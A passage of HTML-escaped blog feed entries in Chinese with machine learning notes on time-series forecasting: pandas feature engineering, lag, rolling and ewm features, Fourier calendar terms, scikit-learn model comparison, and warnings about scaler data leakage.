class="comment"># 数据处理</span></span><br><span class="line">df = pd.read_csv(<span class="string">'data.csv'</span>)</span><br><span class="line">df[<span class="string">'Date'</span>] = pd.to_datetime(df[<span class="string">'Date'</span>])</span><br><span class="line">df[<span class="string">'month'</span>] = df[<span class="string">'Date'</span>].dt.month</span><br><span class="line">df[<span class="string">'dayofweek'</span>] = df[<span class="string">'Date'</span>].dt.dayofweek</span><br><span class="line">df[[<span class="string">'holiday'</span>,<span class="string">'month'</span>,<span class="string">'dayofweek'</span>]] = df[[<span class="string">'holiday'</span>,<span class="string">'month'</span>,<span class="string">'dayofweek'</span>]].astype(<span class="string">'object'</span>)</span><br><span class="line">df = pd.get_dummies(df)</span><br><span class="line">df.drop(<span class="string">'Season'</span>,inplace=<span class="literal">True</span>,axis=<span class="number">1</span>)</span><br><span class="line">df.info()</span><br><span class="line">df.set_index(<span class="string">'Date'</span>,inplace=<span class="literal">True</span>)</span><br><span class="line">data = df.copy()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 相关函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_lag</span><span class="params">(df,l_beg = <span class="number">1</span>,l_end = <span class="number">32</span>)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(l_beg,l_end):</span><br><span class="line">        df[<span class="string">'lag_&#123;&#125;'</span>.format(i)] = df.DailyElectricity.shift(i)</span><br><span class="line">    <span class="keyword">return</span> df</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">split_data</span><span class="params">(n_days,df,indx)</span>:</span></span><br><span class="line">    Y_val = df.iloc[-n_days:,indx].copy()</span><br><span class="line">    df.iloc[-n_days:,indx]=<span class="number">0</span></span><br><span class="line">    make_lag(df)</span><br><span class="line">    X_val = df.iloc[-n_days:].drop(<span class="string">'DailyElectricity'</span>,axis=<span class="number">1</span>)</span><br><span class="line">    df.dropna(inplace=<span class="literal">True</span>)</span><br><span class="line">    X = df[:-n_days].drop(<span class="string">'DailyElectricity'</span>,axis=<span class="number">1</span>)</span><br><span class="line">    Y = df[:-n_days][<span class="string">'DailyElectricity'</span>]</span><br><span class="line">    <span class="keyword">return</span> X,Y,X_val,Y_val</span><br><span class="line">  </span><br><span class="line">df = data.copy()</span><br><span class="line">X,Y,X_val,Y_val = split_data(<span class="number">365</span>,df,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.pipeline <span class="keyword">import</span> Pipeline</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> AdaBoostRegressor,RandomForestRegressor,GradientBoostingRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression,Lasso,LassoLars,SGDRegressor,Ridge</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_val_score</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_models</span><span class="params">(models=&#123;&#125;)</span>:</span></span><br><span class="line">    models[<span class="string">'AdaBoostRegressor'</span>]=AdaBoostRegressor()</span><br><span class="line">    models[<span class="string">'RandomForestRegressor'</span>]=RandomForestRegressor()</span><br><span class="line">    models[<span class="string">'GradientBoostingRegressor'</span>]=GradientBoostingRegressor()</span><br><span class="line">    models[<span class="string">'LinearRegression'</span>]=LinearRegression()</span><br><span class="line">    models[<span class="string">'Lasso'</span>]=Lasso()</span><br><span class="line">    models[<span class="string">'LassoLars'</span>]=LassoLars()</span><br><span class="line">    models[<span class="string">'SGDRegressor'</span>]=SGDRegressor()</span><br><span class="line">    models[<span class="string">'Ridge'</span>]=Ridge()</span><br><span class="line">    <span class="keyword">return</span> models</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_pipe</span><span class="params">(model)</span>:</span></span><br><span class="line">    steps = [(<span class="string">'s'</span>,StandardScaler()),(<span class="string">'m'</span>,model)]</span><br><span class="line">    <span class="keyword">return</span> Pipeline(steps)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">val</span><span class="params">(model,x,y,cv=<span class="number">10</span>)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> cross_val_score(model,X,Y,cv=cv).mean()</span><br><span class="line"></span><br><span class="line">s = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> n,m <span class="keyword">in</span> get_models().items():</span><br><span class="line">    p = make_pipe(m)</span><br><span class="line">    s[n]=val(m,X,Y)</span><br><span class="line">order = sorted(s.items(),key = <span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line">order</span><br><span class="line"></span><br><span class="line">pipe = make_pipe(GradientBoostingRegressor())</span><br><span class="line">best_model = pipe.fit(X,Y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pred_date</span><span class="params">(X_val)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(X_val.shape[<span class="number">0</span>]):</span><br><span class="line">        pred = best_model.predict(np.array(X_val.iloc[i]).reshape(<span class="number">1</span>,<span class="number">-1</span>))</span><br><span class="line">        res.append(pred)</span><br><span class="line">        <span class="keyword">if</span> i+<span class="number">1</span> &lt; X_val.shape[<span class="number">0</span>]:</span><br><span class="line">            X_val.iloc[i+<span class="number">1</span>,<span class="number">-30</span>:] = X_val.iloc[i,<span class="number">-31</span>:<span class="number">-1</span>]</span><br><span class="line">            X_val.iloc[i+<span class="number">1</span>,<span class="number">-31</span>]=pred</span><br><span class="line">    <span class="keyword">return</span> X_val,res</span><br><span class="line">  </span><br><span class="line">X_val,res = pred_date(X_val) </span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> r2_score,mean_squared_error</span><br><span class="line">mean_squared_error(Y_val,res)</span><br><span class="line">r2_score(Y_val,res)</span><br></pre></td></tr></table></figure><h2><span id="踩坑">踩坑</span></h2><ul><li>关于数据预处理</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">预处理的时候不能</span></span><br><span class="line"><span class="string">scaler.fit_trainsform(Xtest)</span></span><br><span class="line"><span class="string">或者</span></span><br><span class="line"><span class="string">scaler.fit(Xtest)</span></span><br><span class="line"><span class="string">scaler.transform(Xtest)</span></span><br><span class="line"><span class="string">因为会导致数据泄露</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">scaler = StandardScaler() <span class="comment">#实例化</span></span><br><span class="line">scaler.fit(Xtrain)</span><br><span class="line">X_train =scaler.transform(Xtrain)</span><br><span class="line">X_test =scaler.transform(Xtest)</span><br><span class="line">norm = MinMaxScaler()</span><br><span class="line">norm.fit(Xtrain)</span><br><span class="line">X_train = norm.transform(Xtrain)</span><br><span class="line">X_test = norm.transform(Xtest)</span><br><span class="line"></span><br><span class="line">scaler = StandardScaler() <span class="comment">#实例化</span></span><br><span class="line">X_train =scaler.fit_transform(Xtrain)</span><br><span class="line">X_test =scaler.transform(Xtest)</span><br><span class="line">norm = MinMaxScaler()</span><br><span class="line">norm.fit(Xtrain)</span><br><span class="line">X_train = norm.fit_transform(Xtrain)</span><br><span class="line">X_test = norm.transform(Xtest)</span><br></pre></td></tr></table></figure><ul><li><p>关于预测</p><p>预测的时候要将整个数据拿去fit,然后再去predict</p></li></ul><h2><span id="trick">Trick</span></h2><ul><li><p>get_dummies的时候最好先把 预测集和测试集合并再分开X[:x.shape[0]]</p></li><li><p>factorized转换回去</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">orig_col = [<span class="string">'b'</span>, <span class="string">'b'</span>, <span class="string">'a'</span>, <span class="string">'c'</span>, <span class="string">'b'</span>]</span><br><span class="line">labels, uniques = pd.factorize(orig_col)</span><br><span class="line"></span><br><span class="line"><span class="comment"># To get original list back</span></span><br><span class="line">uniques[labels]</span><br><span class="line"><span class="comment"># array(['b', 'b', 'a', 'c', 'b'], dtype=object)</span></span><br></pre></td></tr></table></figure></li><li><p>pandas改变行序列</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">col=[<span class="string">'a'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>]</span><br><span class="line">df[col]</span><br></pre></td></tr></table></figure></li><li><p>按月份统计 </p><ul><li>A 星期</li><li>B 月份</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#96;&#96;&#96;df[&#39;month&#39;] &#x3D; df[&#39;Date&#39;].dt.month</span><br></pre></td></tr></table></figure></li><li><p>排序后按自定义顺序显示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#96;&#96;&#96;df.groupby(&#39;f&#39;).reindex(cat)</span><br></pre></td></tr></table></figure></li><li><p>透视</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#96;&#96;&#96;df.pivot(index&#x3D;&#39;name&#39;,columns&#x3D;&#39;year&#39;,values&#x3D;&#39;gdp&#39;)</span><br></pre></td></tr></table></figure><p>![透视前](/Users/disda/Library/Application Support/typora-user-images/image-20220310161405868.png)</p><p>![透视后](/Users/disda/Library/Application Support/typora-user-images/image-20220310161422071.png)</p><p><strong>定类数据</strong></p><p>字符型，此类数据只代表“类别”，类别与类别之间没有必然的相关关系，提供的信息量也最少。例如（颜色：红色，黄色，蓝色，绿色）</p><p>处理方式：ｏｎｅ－ｈｏｔ编码</p><p><strong>定序数据</strong></p><p>字符型，此类数据代表“类别”的同时类别与类别之间可以比较，有顺序。例如（品质：优，良，中，差）</p><p>处理方式：对字符型数值赋值</p><p><strong>定距数据</strong></p><p>数值型，可加减。用于统计计数。例如（卧室数量）</p><p>处理方式：极差缩放，标准化</p><p><strong>定比数据</strong></p><p>数值型，可加减乘除，有绝对“０”值的概念。例如（工资，￥１００是￥５０的２倍）</p><p>处理方式：极差缩放，数值归一化，标准化</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 机器学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习时间序列实战</title>
      <link href="/2022/02/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%97%B6%E9%97%B4%E5%BA%8F%E5%88%97%E5%AE%9E%E6%88%98/"/>
      <url>/2022/02/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%97%B6%E9%97%B4%E5%BA%8F%E5%88%97%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><a id="more"></a><!-- toc --><ul><li><a href="#普通的特征">普通的特征</a></li><li><a href="#傅里叶级数">傅里叶级数</a></li><li><a href="#diff差分shift平移ewmrolling">diff差分/shift平移/ewm/rolling</a></li><li><a href="#验证方法">验证方法</a></li></ul><!-- tocstop --><h2><span id="普通的特征">普通的特征</span></h2><p><strong>不要认为结果集的month没有出现在训练集就不加，要相信模型的能力。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ID = <span class="string">'DateTime'</span></span><br><span class="line"><span class="comment"># df['year'] = df[ID].dt.year </span></span><br><span class="line">df[<span class="string">'month'</span>]=df[ID].dt.month</span><br><span class="line">df[<span class="string">'quarter'</span>]=df[ID].dt.quarter</span><br><span class="line">df[<span class="string">'day'</span>]=df[ID].dt.day</span><br><span class="line">df[<span class="string">'dayofweek'</span>]=df[ID].dt.dayofweek</span><br><span class="line">df[<span class="string">'dayofyear'</span>]=df[ID].dt.dayofyear</span><br><span class="line">df[<span class="string">'week'</span>]=df[ID].dt.week</span><br><span class="line">df[<span class="string">'hour'</span>]=df[ID].dt.hour</span><br><span class="line">df[<span class="string">'weekend'</span>]=df[<span class="string">'dayofweek'</span>].apply(<span class="keyword">lambda</span> x:<span class="number">1</span> <span class="keyword">if</span> x&gt;=<span class="number">5</span> <span class="keyword">else</span> <span class="number">0</span>)</span><br></pre></td></tr></table></figure><h2><span id="傅里叶级数">傅里叶级数</span></h2><p><strong>使得月份，天数等等连续，例如1-12月，1和12差距过大，如果使用傅里叶级数的话相当于变成sin或者cos表示，形成一个圆。</strong></p><ul><li>其中<strong>fs</strong>是看数据的，像这个数据给的是一小时采样6次数据，一年就是1*6*24*365，如果是一天一采的数据就365</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scipy.signal <span class="keyword">import</span> periodogram</span><br><span class="line">F,S=periodogram(tr[out_cols],fs=<span class="number">1</span>*<span class="number">6</span>*<span class="number">24</span>*<span class="number">365</span>,detrend=<span class="string">'linear'</span>)</span><br><span class="line">plt.plot(F,S)</span><br><span class="line">plt.xscale(<span class="string">'log'</span>)</span><br><span class="line">plt.xticks([<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">52</span>,<span class="number">104</span>,<span class="number">365</span>,<span class="number">365</span>*<span class="number">2</span>],[<span class="string">'A'</span>,<span class="string">'hA'</span>,<span class="string">'Q'</span>,<span class="string">'M'</span>,<span class="string">'hM'</span>,<span class="string">'W'</span>,<span class="string">'hW'</span>,<span class="string">'D'</span>,<span class="string">'hD'</span>])</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><ul><li>查看图像最高的值，时间相关性就会比较高</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#39;B&#39; - business day, ie., Mon. - Fri.</span><br><span class="line">&#39;D&#39; - daily</span><br><span class="line">&#39;W&#39; - weekly</span><br><span class="line">&#39;M&#39; - monthly</span><br><span class="line">&#39;A&#39; - annual</span><br><span class="line">&#39;Q&#39; - quarterly</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> statsmodels.tsa.deterministic <span class="keyword">import</span> DeterministicProcess,CalendarFourier</span><br><span class="line"><span class="comment">#傅里叶</span></span><br><span class="line">CF1=CalendarFourier(<span class="string">'A'</span>,<span class="number">1</span>)</span><br><span class="line">CF2=CalendarFourier(<span class="string">'W'</span>,<span class="number">2</span>)</span><br><span class="line">CF3=CalendarFourier(<span class="string">'D'</span>,<span class="number">4</span>)</span><br><span class="line">dp = DeterministicProcess(index=df.DateTime,additional_terms=[CF1,CF2,CF3,CF4]).in_sample()</span><br><span class="line">df = df.merge(dp,left_on=<span class="string">'datetime'</span>,right_index=<span class="literal">True</span>,how=<span class="string">'left'</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_m</span><span class="params">(m=&#123;&#125;)</span>:</span></span><br><span class="line">    m[<span class="string">'RandomForestRegressor'</span>] = RandomForestRegressor(random_state=<span class="number">10</span>)</span><br><span class="line">    m[<span class="string">'GradientBoostingRegressor'</span>] = GradientBoostingRegressor(random_state=<span class="number">10</span>)</span><br><span class="line">    m[<span class="string">'ExtraTreesRegressor'</span>] = ExtraTreesRegressor(random_state=<span class="number">10</span>)</span><br><span class="line">    m[<span class="string">'LGBMRegressor'</span>] = LGBMRegressor(random_state=<span class="number">10</span>)</span><br><span class="line">    m[<span class="string">'LinearRegression'</span>] = LinearRegression()</span><br><span class="line">    m[<span class="string">'HuberRegressor'</span>] = HuberRegressor()</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">split_df</span><span class="params">(df,name)</span>:</span></span><br><span class="line">    train = df[:tr.shape[<span class="number">0</span>]]</span><br><span class="line">    test = df[tr.shape[<span class="number">0</span>]:]</span><br><span class="line">    x = train.drop(name,<span class="number">1</span>)</span><br><span class="line">    x_pre = test.drop(name,<span class="number">1</span>)</span><br><span class="line">    y = train[name]</span><br><span class="line">    <span class="keyword">return</span> x,y,x_pre</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_p</span><span class="params">(l,m)</span>:</span></span><br><span class="line">    s = l.copy()</span><br><span class="line">    s.append((<span class="string">'m'</span>,m))</span><br><span class="line">    <span class="keyword">return</span> Pipeline(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">valid_cv</span><span class="params">(p,x,y,cv=<span class="number">5</span>,log=True)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> cross_val_score(p,x,y,cv=cv).mean()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">valid</span><span class="params">(p,x,y,cv=<span class="number">5</span>,log=True)</span>:</span></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    tss = TimeSeriesSplit(n_splits=cv)</span><br><span class="line">    <span class="keyword">for</span> tri,tei <span class="keyword">in</span> tss.split(x):</span><br><span class="line">        Xtr,Xte = x.iloc[tri,:],x.iloc[tei]</span><br><span class="line">        Ytr,Yte = y.iloc[tri],y.iloc[tei]</span><br><span class="line">        ans = p.fit(Xtr,Ytr).predict(Xte)</span><br><span class="line">        <span class="keyword">if</span> log:</span><br><span class="line">            ans = np.expm1(ans)</span><br><span class="line">        s+=r2_score(Yte,ans)</span><br><span class="line">    <span class="keyword">return</span> s/cv</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_df</span><span class="params">(l,df,name,log=True,s=&#123;&#125;,func=valid)</span>:</span></span><br><span class="line">    x,y,x_pre = split_df(df,name)</span><br><span class="line">    <span class="keyword">if</span> log:</span><br><span class="line">        y = np.log1p(y)</span><br><span class="line">    <span class="keyword">for</span> n,m <span class="keyword">in</span> make_m().items():</span><br><span class="line">        p = make_p(l,m)</span><br><span class="line">        s[n] = func(p,x,y)</span><br><span class="line">    <span class="keyword">return</span> sorted(s.items(),key = <span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h2><span id="diff差分shift平移ewmrolling">diff差分/shift平移/ewm/rolling</span></h2><p>主要用于特征制作lag的值，可以多尝试，target值也可以尝试ewm，但是这道题没用。</p><ul><li>diff(i)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">features =[<span class="string">'Temperature'</span>,<span class="string">'Humidity'</span>]</span><br><span class="line">rang = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> features:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> rang:</span><br><span class="line">        df[<span class="string">f'<span class="subst">&#123;f&#125;</span>_lag_<span class="subst">&#123;i&#125;</span>'</span>] = df[f].diff(i).bfill()</span><br></pre></td></tr></table></figure><ul><li>rolling.mean()</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">features =[<span class="string">'Temperature'</span>,<span class="string">'Humidity'</span>]</span><br><span class="line">rang = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> features:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> rang:</span><br><span class="line">        df[<span class="string">f'<span class="subst">&#123;f&#125;</span>_rolling_<span class="subst">&#123;i&#125;</span>'</span>] = df[f].rolling(i).mean().bfill()</span><br></pre></td></tr></table></figure><ul><li>ewm 标签(可能数据泄露？)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ts_ft</span><span class="params">(x, by, on)</span>:</span></span><br><span class="line">    x.sort_values(by+[<span class="string">'dt'</span>], inplace=<span class="literal">True</span>)</span><br><span class="line">    names = [<span class="string">'mean'</span>, <span class="string">'std'</span>, <span class="string">'median'</span>, <span class="string">'min'</span>, <span class="string">'max'</span>, <span class="string">'skew'</span>, <span class="string">'kurt'</span>]</span><br><span class="line">    sta = &#123;s:[] <span class="keyword">for</span> s <span class="keyword">in</span> names&#125;</span><br><span class="line">    alphas = [<span class="number">0.1</span>, <span class="number">0.3</span>, <span class="number">0.5</span>, <span class="number">0.7</span>, <span class="number">0.9</span>]</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> alphas:</span><br><span class="line">        sta[<span class="string">'ewm_&#123;&#125;'</span>.format(a)] = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> _, g <span class="keyword">in</span> x.groupby(by):</span><br><span class="line">        val = g[on]</span><br><span class="line">        rolled = val.rolling(window=len(g), min_periods=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> names:</span><br><span class="line">            sta[s].extend(getattr(rolled, s)().fillna(method=<span class="string">'bfill'</span>))</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> alphas:</span><br><span class="line">            ewm = val.ewm(alpha=a, adjust=<span class="literal">False</span>).mean()</span><br><span class="line">            sta[<span class="string">'ewm_&#123;&#125;'</span>.format(a)].extend(ewm)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> sta:</span><br><span class="line">        ft_name = <span class="string">'&#123;&#125;_on_&#123;&#125;_by_&#123;&#125;'</span>.format(s, on, by)</span><br><span class="line">        x[ft_name] = sta[s]</span><br></pre></td></tr></table></figure><ul><li>ewm 特征变量</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">time_series_feature</span><span class="params">(X,days=<span class="number">1</span>)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> alpha <span class="keyword">in</span> np.linspace(<span class="number">0.1</span>, <span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="comment">#     X_train[f"&#123;alpha&#125;ewm_var1"] = X_train['var1'].ewm(alpha=alpha).mean()</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> [<span class="string">'temperature'</span>, <span class="string">'windspeed'</span>]:</span><br><span class="line">            X[<span class="string">f"<span class="subst">&#123;alpha&#125;</span>ewm_<span class="subst">&#123;n&#125;</span>"</span>] = X[n].shift(days).ewm(alpha=alpha, adjust=<span class="literal">False</span>).mean().bfill()</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> [<span class="string">'var1'</span>, <span class="string">'temperature'</span>, <span class="string">'windspeed'</span>]:</span><br><span class="line">            w = int(alpha*<span class="number">20</span>)</span><br><span class="line">            <span class="comment"># rolled = X[m].shift().rolling(window=w, min_periods=1)</span></span><br><span class="line">            X[<span class="string">f"<span class="subst">&#123;w&#125;</span>std_<span class="subst">&#123;m&#125;</span>"</span>] = X[m].shift(days).rolling(window=w, min_periods=<span class="number">1</span>).std().bfill()</span><br><span class="line">    <span class="keyword">return</span> X</span><br></pre></td></tr></table></figure><ul><li>lagging 标签（可能没啥用，缺失值太多了）</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_lagging</span><span class="params">(df, df_original, i)</span>:</span></span><br><span class="line">    df1 = df_original.copy()</span><br><span class="line">    df1[<span class="string">'visit_date'</span>] = df1[<span class="string">'visit_date'</span>] + pd.DateOffset(</span><br><span class="line">        days=i)</span><br><span class="line">    df1 = df1.rename(columns=&#123;<span class="string">'visitors'</span>: <span class="string">'lagging'</span> + str(i)&#125;)</span><br><span class="line">    df2 = pd.merge(df,</span><br><span class="line">                   df1[[<span class="string">'air_store_id'</span>, <span class="string">'visit_date'</span>, <span class="string">'lagging'</span> + str(i)]],</span><br><span class="line">                   on=[<span class="string">'air_store_id'</span>, <span class="string">'visit_date'</span>],</span><br><span class="line">                   how=<span class="string">'left'</span>)</span><br><span class="line">    <span class="keyword">return</span> df2</span><br><span class="line">  </span><br><span class="line">lagging = <span class="number">21</span></span><br><span class="line">data1 = df.copy()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, lagging+<span class="number">1</span>):</span><br><span class="line">    data1 = create_lagging(data1, df, i)</span><br></pre></td></tr></table></figure><h2><span id="验证方法">验证方法</span></h2><ul><li>只能看是否改进了，但是分数偏低</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 每次循环都会增大X，在这题比较准确。</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">valid</span><span class="params">(p,X,y,cv=<span class="number">5</span>)</span>:</span></span><br><span class="line">    tss = TimeSeriesSplit(max_train_size=<span class="literal">None</span>, n_splits=cv)</span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> tr_i,te_i <span class="keyword">in</span> tss.split(x):</span><br><span class="line">        <span class="comment"># print(tr_i)</span></span><br><span class="line">        X_train,X_test = X.iloc[tr_i,:],X.iloc[te_i,:]</span><br><span class="line">        y_train,y_test = y.iloc[tr_i,:],y.iloc[te_i,:]</span><br><span class="line">        <span class="comment"># y_train,y_test = y.iloc[tr_i],y.iloc[te_i] y为一维的时候</span></span><br><span class="line">        